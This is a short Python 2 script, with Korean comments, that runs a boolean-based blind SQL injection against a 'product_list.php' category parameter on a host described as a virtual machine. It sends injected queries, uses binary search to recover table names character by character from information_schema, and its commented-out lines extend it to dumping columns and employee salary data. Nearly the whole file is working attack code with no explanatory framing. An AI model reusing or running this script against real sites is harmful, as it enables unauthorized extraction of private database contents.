#-*- coding: utf-8 -*-
import httplib
import urllib
import sys
import time

def BinarySearch(min, max, query):
   mid = (min + max)/2

   bResult = BooleanOperation(query + ">" + str(mid - 1))
   
   if((max - min)<=1):
      if(bResult):
         return min
      else:
         return max
   
   if(bResult):
      return BinarySearch(mid,max,query)
   else:
      return BinarySearch(min,mid,query)

def BooleanOperation(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   domain = "192.168.200.220" #가상 머신의 IP주소
   url = "/product_list.php" #취약한 서브디렉토리 주소
   params = "category=Beverages'+and+1=(" + query + ")%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   time.sleep(0.1)
   if (response.find("Chai")>0):
      return 1
   else:
      return 0

#table_name = "Employees"
#column_name = "FirstName,Salary,HireDate"

rcount = "(select+count(*)+from+information_schema.tables)"
#rcount = "(select+count(*)+from+information_schema.columns+where+table_name='" + table_name + "Employees')"
#rcount = "(select+count(*)+from+" +table_name + ")"

cnt = int(BinarySearch(1,1024,rcount))

print "count : " + str(cnt)

for i in range(0,cnt):
   query_len = "(select+length(table_name)+from+information_schema.tables+limit+" + str(i) + ",1)"
   #query_len = "(select+length(column_name)+from+information_schema.columns+where+table_name='" + table_name + "'+limit+" + str(i) + ",1)"

   #데이터 어떻게 빼오는지 고민해보자
   #query = "(select+concat_ws(','," + column_name + ")+from+" + table_name + "+limit+" + str(i) + ",1)"
   lcount = int(BinarySearch(1,128,query_len))+1

   for j in range(1,lcount):
      query = "(select+ascii(substring(table_name," + str(j) + ",1))from+information_schema.tables+limit+" + str(i) + ",1)"
      #query = "(select+ascii(substring(column_name," + str(j) + ",1))from+information_schema.columns+where+table_name='" + table_name + "'+limit+" + str(i) + ",1)"
      sys.stdout.write(chr(BinarySearch(1,128,query)))
   print ""
   
   
   